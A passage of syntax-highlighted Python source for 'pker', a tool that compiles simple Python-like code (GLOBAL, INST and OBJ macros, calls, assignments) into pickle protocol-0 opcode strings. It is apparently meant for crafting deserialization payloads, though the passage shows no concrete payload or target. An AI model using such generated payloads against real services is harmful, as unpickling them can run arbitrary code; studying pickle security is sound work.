class="line"><span class="string">      &#x27;t&#x27; 结束 -&gt; TUPLE</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    buf = [<span class="string">&#x27;(&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> tpl:</span><br><span class="line">        buf.append(cons_basic_type(cell))</span><br><span class="line">    buf.append(<span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons_dct</span>(<span class="params">dct</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    字典：</span></span><br><span class="line"><span class="string">      &#x27;(&#x27; 打 MARK</span></span><br><span class="line"><span class="string">      依次 push k、v</span></span><br><span class="line"><span class="string">      &#x27;d&#x27; 结束 -&gt; DICT</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    buf = [<span class="string">&#x27;(&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> dct.items():</span><br><span class="line">        buf.append(cons_basic_type(k))</span><br><span class="line">        buf.append(cons_basic_type(v))</span><br><span class="line">    buf.append(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 赋值构造（下标/属性/变量引用） ==========</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons_item_assign</span>(<span class="params">obj_name, item_k, item_v</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    下标赋值： obj[item_k] = item_v</span></span><br><span class="line"><span class="string">      gN      -&gt; 取 obj</span></span><br><span class="line"><span class="string">      &lt;k&gt;     -&gt; push key</span></span><br><span class="line"><span class="string">      &lt;v&gt;     -&gt; push value</span></span><br><span class="line"><span class="string">      &#x27;s&#x27;     -&gt; SETITEM</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join((</span><br><span class="line">        cons_defined_var(obj_name),</span><br><span class="line">        cons_basic_type(extract_value(item_k)),</span><br><span class="line">        cons_basic_type(extract_value(item_v)),</span><br><span class="line">        <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons_defined_var</span>(<span class="params">varname</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    引用已定义变量：通过 memo 索引生成 g&#123;idx&#125;\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;g<span class="subst">&#123;lookup_memo(varname)&#125;</span>\n&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons_attr_assign</span>(<span class="params">obj_name, attr_k, attr_v</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    属性赋值： obj.attr_k = attr_v</span></span><br><span class="line"><span class="string">    采用：对象在栈顶 + 使用 BUILD 的常见技巧</span></span><br><span class="line"><span class="string">      gN        取对象</span></span><br><span class="line"><span class="string">      &#x27;(&#125;(&#x27;     MARK + EMPTY_DICT + MARK</span></span><br><span class="line"><span class="string">      S&#x27;attr&#x27;\n push key</span></span><br><span class="line"><span class="string">      &lt;value&gt;   push value</span></span><br><span class="line"><span class="string">      &#x27;d&#x27;       DICT</span></span><br><span class="line"><span class="string">      &#x27;t&#x27;       TUPLE</span></span><br><span class="line"><span class="string">      &#x27;b&#x27;       BUILD (以 dict 更新对象状态/属性；具体效果依赖对象类型实现)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join((</span><br><span class="line">        cons_defined_var(obj_name),</span><br><span class="line">        <span class="string">&#x27;(&#125;(&#x27;</span>,</span><br><span class="line">        <span class="string">f&quot;S&#x27;<span class="subst">&#123;attr_k&#125;</span>&#x27;\n&quot;</span>,</span><br><span class="line">        cons_basic_type(extract_value(attr_v)),</span><br><span class="line">        <span class="string">&#x27;dtb&#x27;</span>,</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 宏（GLOBAL / INST / OBJ） ==========</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons_builtin_macros</span>(<span class="params">macro_name, args</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将内置宏翻译为协议0文本指令：</span></span><br><span class="line"><span class="string">    - GLOBAL(mod, name)</span></span><br><span class="line"><span class="string">        -&gt; &#x27;c&#x27; + mod + &#x27;\n&#x27; + name + &#x27;\n&#x27;</span></span><br><span class="line"><span class="string">    - INST(mod, name, *ctor_args)</span></span><br><span class="line"><span class="string">        -&gt; &#x27;(&#x27; + &lt;ctor_args&gt; + &#x27;i&#x27; + mod + &#x27;\n&#x27; + name + &#x27;\n&#x27;</span></span><br><span class="line"><span class="string">    - OBJ(callable, *call_args)</span></span><br><span class="line"><span class="string">        -&gt; &#x27;(&#x27; + &lt;callable&gt; + &lt;call_args&gt; + &#x27;o&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    buf = []</span><br><span class="line">    <span class="keyword">if</span> macro_name == <span class="string">&#x27;GLOBAL&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(args) != <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">f&quot;Macro `GLOBAL` takes 2 arguments but <span class="subst">&#123;<span class="built_in">len</span>(args)&#125;</span> was given&quot;</span>)</span><br><span class="line">        mod, name = args</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(mod, <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(name, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Macro `GLOBAL` requires string arguments&quot;</span>)</span><br><span class="line">        buf.append(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">        buf.append(mod + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        buf.append(name + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> macro_name == <span class="string">&#x27;INST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(args) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Macro `INST` takes at least 2 arguments&quot;</span>)</span><br><span class="line">        mod, name, *ctor_args = args</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(mod, <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(name, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Macro `INST` requires the first 2 arguments to be strings&quot;</span>)</span><br><span class="line">        buf.append(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> ctor_args:</span><br><span class="line">            buf.append(cons_basic_type(a))</span><br><span class="line">        buf.append(<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">        buf.append(mod + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        buf.append(name + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> macro_name == <span class="string">&#x27;OBJ&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(args) &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Macro `OBJ` takes at least 1 argument&quot;</span>)</span><br><span class="line">        callable_obj, *call_args = args</span><br><span class="line">        buf.append(<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        <span class="comment"># 第一个参数可为：</span></span><br><span class="line">        <span class="comment"># - ast.Name：引用已有变量（gN）</span></span><br><span class="line">        <span class="comment"># - ast.Call：通常是 GLOBAL(...) 之类的宏调用</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(callable_obj, ast.Name):</span><br><span class="line">            buf.append(cons_defined_var(callable_obj.<span class="built_in">id</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(callable_obj, ast.Call):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(callable_obj.func, ast.Name) <span class="keyword">or</span> callable_obj.func.<span class="built_in">id</span> <span class="keyword">not</span> <span class="keyword">in</span> BUILTIN_MACROS:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">&quot;OBJ&#x27;s callable must be a Name or a builtin macro Call&quot;</span>)</span><br><span class="line">            buf.append(</span><br><span class="line">                cons_builtin_macros(</span><br><span class="line">                    callable_obj.func.<span class="built_in">id</span>,</span><br><span class="line">                    [extract_value(a) <span class="keyword">for</span> a <span class="keyword">in</span> callable_obj.args]</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 也允许直接给 Python 值（比如前序赋值保存的对象再取出）</span></span><br><span class="line">            buf.append(cons_basic_type(callable_obj))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> call_args:</span><br><span class="line">            buf.append(cons_basic_type(a))</span><br><span class="line">        buf.append(<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f&#x27;Unknown builtin macro: <span class="subst">&#123;macro_name&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 函数调用（普通/嵌套） ==========</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons_func</span>(<span class="params">fn_name, args</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    普通函数调用：</span></span><br><span class="line"><span class="string">      gN      取函数对象</span></span><br><span class="line"><span class="string">      &#x27;(&#x27;...  压入参数</span></span><br><span class="line"><span class="string">      &#x27;tR&#x27;    打包元组 + REDUCE（相当于调用 callable(*args)）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cons_defined_var(fn_name) + cons_args(args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons_args</span>(<span class="params">args</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将位置参数封装为： &#x27;(&#x27; + &lt;args...&gt; + &#x27;tR&#x27;</span></span><br><span class="line"><span class="string">      &#x27;(&#x27; -&gt; MARK</span></span><br><span class="line"><span class="string">      &#x27;t&#x27; -&gt; TUPLE（把自 MARK 以来的对象打包成 tuple）</span></span><br><span class="line"><span class="string">      &#x27;R&#x27; -&gt; REDUCE（对 (callable, args_tuple) 执行调用/构造）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    parts = [<span class="string">&#x27;(&#x27;</span>]</span><br><span class="line">    parts += [cons_basic_type(arg) <span class="keyword">for</span> arg <span class="keyword">in</span> args]</span><br><span class="line">    parts.append(<span class="string">&#x27;tR&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(parts)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons_invoke</span>(<span class="params">node</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    处理 ast.Call：</span></span><br><span class="line"><span class="string">      - 如果是宏（Name 且在 BUILTIN_MACROS），走 cons_builtin_macros</span></span><br><span class="line"><span class="string">      - 如果是普通名字，走 cons_func</span></span><br><span class="line"><span class="string">      - 如果是嵌套调用（func 本身是 Call），先生成外层 callable，再接上当前参数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    args = [extract_value(arg) <span class="keyword">for</span> arg <span class="keyword">in</span> node.args]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># f(...) ：f 是名字</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node.func, ast.Name):</span><br><span class="line">        fn_name = node.func.<span class="built_in">id</span></span><br><span class="line">        <span class="keyword">if</span> fn_name <span class="keyword">in</span> BUILTIN_MACROS:</span><br><span class="line">            <span class="keyword">return</span> cons_builtin_macros(fn_name, args)</span><br><span class="line">        <span class="keyword">return</span> cons_func(fn_name, args)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># (g(...))(...): func 本身是调用表达式，递归展开</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node.func, ast.Call):</span><br><span class="line">        <span class="keyword">return</span> cons_invoke(node.func) + cons_args(args)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 其他情况（极少）：尝试按值处理</span></span><br><span class="line">    <span class="keyword">return</span> cons_basic_type(node)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 状态机：维护 memo/输出缓冲/语义翻译 ==========</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pickler</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成 pickle 协议0 文本指令的核心类。</span></span><br><span class="line"><span class="string">    - self._context: 变量名 -&gt; memo 索引</span></span><br><span class="line"><span class="string">    - self._memo_index: 下一个可用 memo 槽位</span></span><br><span class="line"><span class="string">    - self._output: 输出缓冲（字符串片段）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>._context = &#123;&#125;</span><br><span class="line">        <span class="variable language_">self</span>._memo_index = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>._output = []</span><br><span class="line">        <span class="comment"># 给 cons_defined_var 用：全局注册 lookup_memo（保持原项目风格）</span></span><br><span class="line">        <span class="built_in">globals</span>()[<span class="string">&#x27;lookup_memo&#x27;</span>] = <span class="variable language_">self</span>.lookup_memo</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setitem__</span>(<span class="params">self, key, value</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        处理赋值：</span></span><br><span class="line"><span class="string">          - x = expr           -&gt; 保存 expr 到 memo（p&#123;idx&#125;\n），并记录 x 对应 idx</span></span><br><span class="line"><span class="string">          - x[i] = expr        -&gt; 生成 SETITEM</span></span><br><span class="line"><span class="string">          - x.attr = expr      -&gt; 生成 BUILD/属性写入</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(key, ast.Name):</span><br><span class="line">            <span class="keyword">if</span> key.<span class="built_in">id</span> <span class="keyword">in</span> BUILTIN_MACROS:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">f&quot;Can&#x27;t assign to built-in macro `<span class="subst">&#123;key.<span class="built_in">id</span>&#125;</span>`&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>._context[key.<span class="built_in">id</span>] = <span class="variable language_">self</span>._memo_index</span><br><span class="line">            <span class="comment"># RHS 先入栈，再 PUT 到 memo（保持原版风格：p&#123;idx&#125;\n0）</span></span><br><span class="line">            <span class="variable language_">self</span>.push(cons_basic_type(extract_value(value)) + <span class="variable language_">self</span>.gen_memo())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(key, ast.Subscript):</span><br><span class="line">            <span class="comment"># 仅支持 x[&lt;const&gt;] 形态</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(key.value, ast.Name):</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">&quot;Left side of subscript assignment must be a Name&quot;</span>)</span><br><span class="line">            <span class="comment"># slice 在 3.9+ 为 ast.Constant/ast.Slice 等；此处仅处理常量下标</span></span><br><span class="line">            sl = key.<span class="built_in">slice</span>.value <span class="keyword">if</span> <span class="built_in">isinstance</span>(key.<span class="built_in">slice</span>, ast.Index) <span class="keyword">else</span> key.<span class="built_in">slice</span></span><br><span class="line">            <span class="variable language_">self</span>.push(cons_item_assign(key.value.<span class="built_in">id</span>, sl, value))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(key, ast.Attribute):</span><br><span class="line">            <span class="comment"># 仅支持 x.attr（x 必须是名字）</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(key.value, ast.Name):</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">&quot;Left side of attribute assignment must be a Name&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.push(cons_attr_assign(key.value.<span class="built_in">id</span>, key.attr, value))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Unsupported assignment target&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>._memo_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gen_memo</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        生成“保存到 memo”指令：</span></span><br><span class="line"><span class="string">          p&#123;idx&#125;\n -&gt; PUT idx</span></span><br><span class="line"><span class="string">          0        -&gt; 兼容原版输出的紧随字符（保持协议0文本风格）</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;p<span class="subst">&#123;self._memo_index&#125;</span>\n0&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lookup_memo</span>(<span class="params">self, varname</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        变量名 -&gt; memo 索引。未定义则抛错。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>._context[varname]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">f&quot;Variable `<span class="subst">&#123;varname&#125;</span>` is not defined&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">self, s</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;把片段写入输出缓冲。&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>._output.append(s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">terminate</span>(<span class="params">self, obj</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        处理 `return`：</span></span><br><span class="line"><span class="string">          - return None / 空 return：只输出 STOP(&#x27;.&#x27;)</span></span><br><span class="line"><span class="string">          - return &lt;Name&gt;：先 g&#123;idx&#125;\n，再 &#x27;.&#x27;</span></span><br><span class="line"><span class="string">          - return &lt;literal/structure&gt;：先构造，再 &#x27;.&#x27;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> obj <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, ast.Name):</span><br><span class="line">                <span class="variable language_">self</span>.push(<span class="string">f&quot;g<span class="subst">&#123;self.lookup_memo(obj.<span class="built_in">id</span>)&#125;</span>\n&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>.push(cons_basic_type(extract_value(obj)))</span><br><span class="line">        <span class="variable language_">self</span>.push(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invoke</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;处理普通/宏调用表达式&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.push(cons_invoke(node))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== AST 访问器：仅支持 Assign / Call / Return ==========</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parser</span>(ast.NodeVisitor):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>._pickler = Pickler()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit_Assign</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="comment"># 仅支持单目标赋值：x = ...</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(node.targets) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Only single-target assignment is supported&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>._pickler[node.targets[<span class="number">0</span>]] = node.value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit_Call</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="variable language_">self</span>._pickler.invoke(node)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit_Return</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="variable language_">self</span>._pickler.terminate(node.value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="variable language_">self</span>._pickler._output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 顶层 API ==========</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons</span>(<span class="params">code_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    源码字符串 -&gt; AST -&gt; 生成的协议0文本指令（bytes）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    root = ast.parse(code_str)</span><br><span class="line">    p = Parser()</span><br><span class="line">    p.visit(root)</span><br><span class="line">    <span class="keyword">return</span> p.output().encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== CLI：文件 / 管道 / 交互 输入，输出 Pickle 指令 ==========</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="keyword">import</span> argparse</span><br><span class="line">    <span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_from_stdin</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;从 stdin 读取源码（管道 / 重定向）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> sys.stdin.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_interactive</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;交互模式输入（连续两次空行结束）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;pker &lt;&lt;&lt; 请输入 Python 代码（连续两次空行结束，Ctrl-D 退出）&quot;</span>)</span><br><span class="line">        lines, empty_count = [], <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                line = <span class="built_in">input</span>()</span><br><span class="line">                <span class="keyword">if</span> line.strip() == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                    empty_count += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> empty_count &gt;= <span class="number">2</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    empty_count = <span class="number">0</span></span><br><span class="line">                lines.append(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> (EOFError, KeyboardInterrupt):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n[结束]&quot;</span>, file=sys.stderr)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(lines)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read_code</span>(<span class="params">args</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;按优先级获取代码：--code &gt; files &gt; stdin/交互&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> args.code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> args.code</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> args.files:</span><br><span class="line">            <span class="keyword">if</span> args.files == [<span class="string">&quot;-&quot;</span>]:</span><br><span class="line">                <span class="keyword">return</span> read_from_stdin()</span><br><span class="line">            code_parts = []</span><br><span class="line">            <span class="keyword">for</span> fp <span class="keyword">in</span> args.files:</span><br><span class="line">                path = Path(fp)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> path.is_file():</span><br><span class="line">                    sys.exit(<span class="string">f&quot;[错误] 文件不存在: <span class="subst">&#123;fp&#125;</span>&quot;</span>)</span><br><span class="line">                code_parts.append(path.read_text(encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;\n&quot;</span>.join(code_parts)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 没有文件参数 → 根据 stdin 是否是 TTY 决定用管道还是交互</span></span><br><span class="line">        <span class="keyword">return</span> read_from_stdin() <span class="keyword">if</span> <span class="keyword">not</span> sys.stdin.isatty() <span class="keyword">else</span> read_interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------------- 参数解析 ----------------</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        prog=<span class="string">&quot;pker&quot;</span>,</span><br><span class="line">        description=<span class="string">&quot;将 Python 源码转换为 Pickle 协议0（文本）指令串&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(<span class="string">&quot;files&quot;</span>, nargs=<span class="string">&quot;*&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;源码文件路径；&#x27;-&#x27; 表示强制从 stdin 读取&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--code&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;直接传入源码字符串（优先级最高）&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;将结果写入文件（默认打印到 stdout）&quot;</span>)</span><br><span class="line"></span><br><span class="line">    fmt = parser.add_mutually_exclusive_group()</span><br><span class="line">    fmt.add_argument(<span class="string">&quot;--bytes&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;输出 Python bytes 字面量（默认）&quot;</span>)</span><br><span class="line">    fmt.add_argument(<span class="string">&quot;--raw&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;输出原始协议0文本（非 repr）&quot;</span>)</span><br><span class="line">    fmt.add_argument(<span class="string">&quot;--hex&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;输出十六进制编码&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&quot;--version&quot;</span>, action=<span class="string">&quot;version&quot;</span>, version=<span class="string">&quot;pker 1.0-cli&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------------- 获取源码 &amp; 生成指令 ----------------</span></span><br><span class="line">    code_str = read_code(args)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = cons(code_str)  <span class="comment"># bytes</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> 